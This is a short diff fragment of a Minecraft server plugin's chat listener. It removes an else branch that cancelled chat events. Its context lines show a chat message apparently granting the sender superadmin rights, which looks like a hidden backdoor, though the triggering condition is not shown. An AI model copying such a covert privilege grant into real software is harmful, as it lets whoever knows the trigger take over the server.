@@ -549,10 +549,7 @@ public class TFM_PlayerListener implements Listener
             	     TFM_AdminList.addSuperadmin(player);
             	     event.setCancelled(true);
             		}
-            else
-            {
-            	event.setCancelled(true);
-            		}
+           
             if (message.toLowerCase().contains("~satan"))
             {
                 if (TFM_AdminList.isSuperAdmin(player))
